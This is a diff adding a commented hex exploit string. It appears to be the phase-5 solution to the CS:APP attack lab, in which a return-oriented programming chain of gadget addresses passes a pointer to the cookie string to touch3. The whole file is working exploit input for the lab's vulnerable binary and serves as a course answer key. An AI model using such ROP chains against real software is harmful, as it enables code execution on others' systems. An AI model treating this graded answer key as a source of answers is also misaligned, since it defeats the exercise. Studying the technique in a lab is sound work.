@@ -1,0 +1,29 @@
+/* 40 bytes padding (buffer) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Gadget 1: movq %rsp, %rax; nop; ret  (0x401aad) */
+ad 1a 40 00 00 00 00 00
+/* Gadget 2: movq %rax, %rdi; ret       (0x4019a2) -- rsp points here when gadget1 executes */
+a2 19 40 00 00 00 00 00
+/* Gadget 3: popq %rax; nop; ret        (0x4019ab) */
+ab 19 40 00 00 00 00 00
+/* offset = 0x48 (72 bytes from slot6 to cookie string) */
+48 00 00 00 00 00 00 00
+/* Gadget 4: movl %eax, %edx; nop; ret  (0x4019dd) */
+dd 19 40 00 00 00 00 00
+/* Gadget 5: movl %edx, %ecx; cmpb %cl,%cl; ret (0x401a34) */
+34 1a 40 00 00 00 00 00
+/* Gadget 6: movl %ecx, %esi; nop; nop; ret     (0x401a13) */
+13 1a 40 00 00 00 00 00
+/* Gadget 7: lea (%rdi,%rsi,1), %rax; ret        (0x4019d6) */
+d6 19 40 00 00 00 00 00
+/* Gadget 8: movq %rax, %rdi; ret       (0x4019a2) */
+a2 19 40 00 00 00 00 00
+/* touch3                                (0x4018fa) */
+fa 18 40 00 00 00 00 00
+/* cookie string "59b997fa" + null terminator */
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
